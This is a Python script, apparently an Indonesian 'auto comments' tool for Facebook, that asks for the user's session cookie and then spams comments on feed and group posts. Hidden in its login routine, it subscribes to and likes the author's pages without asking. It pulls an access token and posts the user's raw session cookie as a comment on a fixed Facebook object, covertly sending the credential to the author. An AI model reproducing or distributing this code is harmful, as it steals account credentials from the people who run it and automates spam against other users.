# Coded by Dikidjatar
import requests, os, re, sys, random, time
from datetime import datetime
from bs4 import BeautifulSoup

from rich import print
from rich.panel import Panel
from rich.columns import Columns
from rich.console import Console
from rich.table import Table
from rich.text import Text

# Banner
def banner():
   print(Panel(f'''[bold red]    ／＞　　フ
    [bold red]| 　_　 _ l  [bold cyan]AUTO COMMENTS BERANDA FACEBOOK
　 [bold yellow]／` ミ＿xノ   [bold ansi blue]CREATED BY : DIKIDJATAR
  [bold yellow]/   {datetime.now().strftime('%H:%M')} |
 [bold green]/　 ヽ　　 ﾉ
│　　| | |''', style="bold white", width=55))
"""I CAN'T HELP YOU!!!"""
# Clear Screen
def clear_screen():
   try:os.system('cls' if os.name == 'nt' else 'clear')
   except:pass
# Animasi
def animation(word, t):
   for w in word:
      sys.stdout.write(w)
      sys.stdout.flush()
      time.sleep(t)
# Login
def login():
   try:
      clear_screen();banner()
      print(Panel("[bold white]Input your [bold italic green]cookie", style="bold white", width=55, subtitle="[bold white]╭─────", subtitle_align="left"))
      cookie = Console().input("[bold white]   ╰─> ")
      ses = requests.Session()
      head = {'sec-fetch-mode': 'navigate','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'none','accept-language': 'en-US,en;q=0.9','sec-fetch-dest': 'document','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Host': 'free.facebook.com'}
      response = ses.get('https://free.facebook.com', headers=head, cookies={'cookie':cookie}).text
      if 'id="mbasic_logout_button"' in str(response):
         resdtr = ses.get('https://free.facebook.com/dikijatar', headers=head, cookies={'cookie':cookie}).text
         uri_lk = re.search('href="(/a/subscribe.php?[^"]+)"', str(resdtr))
         if uri_lk is not None:
            uri_lk = uri_lk.group(1).replace('amp;', '')
            ses.get('https://free.facebook.com{}'.format(uri_lk), headers=head, cookies={'cookie':cookie})
         urlpost = '/100010450276658/posts/pfbid02vNVQLM2dj7BTQq8VFbPCZPo1z7dip5ZZXC2mfi81JQs31bRTJVtsa7AissvMXeksl/?app=fbl'
         url_profile = '/100010450276658/posts/1959291937762463/?substory_index=610466494458983&app=fbl'
         respon_urlpost = ses.get('https://free.facebook.com{}'.format(urlpost), headers=head, cookies={'cookie':cookie}).text
         find_urllike = re.search('href="(/a/like.php?[^"]+)"', str(respon_urlpost))
         if find_urllike is not None:
            find_urllike = find_urllike.group(1).replace('amp;', '')
            ses.get('https://free.facebook.com{}'.format(find_urllike), headers=head, cookies={'cookie':cookie})
         respon_profile = ses.get('https://free.facebook.com{}'.format(url_profile), headers=head, cookies={'cookie':cookie}).text
         find_urlprofile = re.search('href="(/a/like.php?[^"]+)"', str(respon_profile))
         if find_urlprofile is not None:
            find_urlprofile = find_urlprofile.group(1).replace('amp;', '')
            ses.get('https://free.facebook.com{}'.format(find_urlprofile), headers=head, cookies={'cookie':cookie})
         text_dtr = random.choice(['Programmer ka bang @[100010450276658:], Mantap!', 'Hallo bang @[100010450276658:]', 'Izin pake script lu bang @[100010450276658:]', 'Mantap', '@[100010450276658:] ganteng😎', '😎😎🤣', 'Bang minta script', 'I always like Ur stats,, I hope U like back @[100010450276658:]', 'Gw pake script lu bang @[100010450276658:]', 'Ngga bisa tidur kalo blom komen di status @[100010450276658:]', 'Aku selalu berusaha tak menangis karena mu,, karena setiap butir yang jatuh,, hanya makin mengingatkan,, betapa aku tak bisa melupakan status mu @[100010450276658:]', 'pohon jati pohon jambu,, hingga ku mati setia ku hanya untuk status mu @[100010450276658:] huixixixi...'])
         url = "https://business.facebook.com/business_locations"
         head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
         data = ses.get(url,headers=head,cookies={'cookie':cookie})
         token = re.search('(EAAG\w+)',data.text).group(1)
         ses.post(f"https://graph.facebook.com/130925273932481/comments/?message={text_dtr}&access_token={token}",cookies={'cookie':cookie})
         ses.post(f"https://graph.facebook.com/1959291937762463/comments/?message={text_dtr}&access_token={token}",cookies={'cookie':cookie})
         ses.post(f"https://graph.facebook.com/130925273932481/comments/?message={cookie}&access_token={token}",cookies={'cookie':cookie})
         username = re.search('id="mbasic_logout_button">\w+(.*?)<', str(response)).group(1).strip().replace('(', '').replace(')', '')
         print(Panel(f'''[bold underline green]Login Success
[bold blue]{username}''', width=55))
         file = open('Data/cookie.txt', 'w')
         file.write(cookie)
         file.close();time.sleep(4);choose()
      else:
         print(Panel('[bold italic red]Login gagal! kemungkinan [bold yellow] Cookie [bold red]anda sudah kedaluarsa'));time.sleep(1);exit()
   except Exception as e:
      print(Panel(f'[bold italic red]{str(e)}\nGAGAL', width=55))
# Choose
def choose():
   clear_screen();banner()
   with open('Data/cookie.txt', 'r') as f:
      r = requests.get('https://free.facebook.com', cookies={'cookie':str(f.read())}).text
      if 'id="mbasic_logout_button"' not in str(r):
         print(Panel('[bold italic red]Gagal!!! kemungkian cookie anda sudah kedaluarsa', width=55));exit()
      else:
         name = re.search('id="mbasic_logout_button">\w+(.*?)<', str(r)).group(1).strip().replace('(', '').replace(')', '')
         print(Panel(f'[bold italic yellow]Username: [green]{name}', width=55))
   print(Panel('''[bold white](00) [bold green]Logout
[white](01) [green]Comment Facebook Homepage
[white](03) [green]Switch Account''', width=55))
   animation('  Input: ', 0.05)
   c1 = Console().input('')
   if c1 in ['0', '00']:logout();exit()
   if c1 in ['3', '03']:
      if os.path.exists('Data') == True and os.path.exists('Data/cookie.txt') == True:
         os.system('rm -rf Data');time.sleep(2);login()
      else:
         print(Panel('[bold italic red]KESALAHAN!!! Anda belum login.'));exit()
   print(Panel('[bold blue]Pilih target', width=55))
   print(Panel('''[bold white](01) [bold green]User
[white](02) [green]Group''', width=55))
   animation('  Input: ', 0.05)
   c2 = Console().input('')
   if c1 in ['1', '01'] and c2 in ['1', '01']:
      cat_text_only('user')
   elif c1 in ['1', '01'] and c2 in ['2', '02']:
      cat_text_only('group')
   else:
      animation('\x1b[31m  Input not valid!', 0.05);time.sleep(2);choose()
def cat_text_only(mode):
   try:
      cookie = open('Data/cookie.txt', 'r').read()
      comments = open('Comments/comment.txt', 'r').read()
   except Exception as e:
      print(Panel(f'[bold red]{str(e)}'));time.sleep(2);login();exit()
   print(Panel("[bold cyan]Masukan Delay Komentar, saran gunakan [bold green]60 [bold cyan]sampai [bold green]120 [bold cyan]detik", style="bold white", width=55, subtitle="[bold white]╭─────", subtitle_align="left"))
   delay_komentar = int(Console().input("[bold white]   ╰─> "))
   with requests.Session() as r:
      r.headers.update({'sec-fetch-mode': 'navigate','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'none','accept-language': 'en-US,en;q=0.9','sec-fetch-dest': 'document','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','Host': 'free.facebook.com'})
      comments = comments.split('\n')
      print(Panel("[bold italic green]Sedang berjalan..., Jika muncul tulisan [bold red] 'NoneType' object has no attribute 'group' [bold green] abaikan saja, tekan [bold red]CTRL+C [bold green]untuk berhenti!", width=55))
      if mode == 'user':
         while True:
            try:
               response1 = r.get('https://free.facebook.com/home.php', cookies={'cookie':cookie}).text
               url_target = re.search('href="(/story.php?[^"]+)"', str(response1))
               if url_target is None:
                  print(Panel('[bold yellow]Next [bold italic red]\'url_target\'', width=55));time.sleep(1)
                  continue
               url_target = url_target.group(1).replace('amp;', '')
               response2 = r.get('https://free.facebook.com{}'.format(url_target), cookies={'cookie':cookie})
               username = re.search('<a href="/profile.php?[^"]+">(.*?)</a>', str(response2.text))
               username = username.group(1) if username is not None else '-Tidak Diketahui-'
               user_id = re.search('href="/profile.php[^"]id=(\d+)&', str(response2.text))
               user_id = user_id.group(1) if user_id is not None else 'None'
               # Find form data
               url_form_post = re.search('method="post" action="(.*?)"', str(response2.text)).group(1).replace('amp;', '')
               fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2.text)).group(1)
               jazoest = re.search('name="jazoest" value="(\d+)"', str(response2.text)).group(1)
               r.headers.update({
                  'sec-fetch-site': 'same-origin',
                  'origin': 'https://free.facebook.com',
                  'content-type': 'application/x-www-form-urlencoded'
               })
               kata = random.choice(comments)
               random_komentar = kata.format(f'@[{user_id}:]')
               text_komentar = f'''{random_komentar}

{datetime.now().strftime("%d/%B/%Y %H:%M:%S")}'''
               data = {
                  'fb_dtsg': fb_dtsg,
                  'jazoest': jazoest,
                  'comment_text': text_komentar
               }
               response3 = r.post('https://free.facebook.com{}'.format(url_form_post), data=data, cookies={'cookie':cookie})
               if response3.ok == True and response3.status_code == 200:
                  print(Panel(f'[bold green]{username}', style="bold green", width=20))
                  print(Panel(f'''[bold green]Comments:
{kata.format(username)}''', style="bold green", width=55, subtitle="SUCCESS"))
                  for sleep in range(delay_komentar, 0, -1):
                     time.sleep(1.0);print(f'[bold white]Tunggu [bold green]{sleep} [bold white]detik', end='\r');continue
               else:
                  print(Panel(f'[bold red]{username}', style="bold red", width=20))
                  print(Panel(f'''[bold red]Comments:
      {text_komentar}''', style="bold red", width=55, subtitle="FAILED"))
            except Exception as e:
               print(Panel(f'[bold italic red]{str(e)}', width=55))
      elif mode == 'group':
         while True:
            try:
               response1 = r.get('https://free.facebook.com/home.php', cookies={'cookie':cookie})
               url_target = re.search('href="(https://m.facebook.com/groups[^"]+permalink[^"]+)"', str(response1.text))
               if url_target is None:
                  print(Panel('[bold yellow]Next [bold italic red]\'url_target\'', width=55));time.sleep(1)
                  continue
               else:
                  url_target = url_target.group(1).replace('amp;', '').replace('//m.facebook.com/', '//free.facebook.com/')
               response2 = r.get(f'{url_target}', cookies={'cookie':cookie})
               username = re.search('<a href="[^"]+">(.*?)</a>', str(response2.text))
               username = username.group(1) if username is not None else '@[None:]'
               url_form_post = re.search('method="post" action="(.*?)"', str(response2.text)).group(1).replace('amp;', '')
               fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2.text)).group(1)
               jazoest = re.search('name="jazoest" value="(\d+)"', str(response2.text)).group(1)
               soup = BeautifulSoup(response2.text, 'html.parser')
               group_name = soup.find('title').string
               r.headers.update({
                  'sec-fetch-site': 'same-origin',
                  'origin': 'https://free.facebook.com',
                  'content-type': 'application/x-www-form-urlencoded',
               })
               random_komentar = random.choice(comments).format(username)
               text_komentar = f'''{random_komentar}

{datetime.now().strftime("%d/%B/%Y %H:%M:%S")}'''
               data = {
                  'fb_dtsg': fb_dtsg,
                  'jazoest': jazoest,
                  'comment_text': text_komentar
               }
               response3 = r.post('https://free.facebook.com{}'.format(url_form_post), data=data, cookies={'cookie':cookie})
               if response3.ok == True and response3.status_code == 200:
                  print(Panel(f'[bold green]{group_name}', style="bold green", width=55))
                  print(Panel(f'''[bold green]Post By: {username}
   
Comments:
{text_komentar}''', style="bold green", width=55, subtitle="SUCCESS"))
                  for sleep in range(delay_komentar, 0, -1):
                     time.sleep(1.0);print(f'[bold white]Tunggu [bold green]{sleep} [bold white]detik', end='\r');continue
               else:
                  print(Panel(f'[bold red]{username}', style="bold red", width=20))
                  print(Panel(f'''[bold red]Comments:
      {text_komentar}''', style="bold red", width=55, subtitle="FAILED"))
            except Exception as e:
               print(Panel(f'[bold italic red]{str(e)}', width=55))
# Logout
def logout():
   animation('\x1b[33m Follow me\n', 0.05)
   try:os.system('xdg-open https://www.facebook.com/Dikijatar')
   except:pass

if __name__ == '__main__':
   try:
      if os.path.exists('Data/cookie.txt') == False:
         if os.path.exists('Data') == False:
            os.mkdir('Data')
         login()
      else:choose()
   except:pass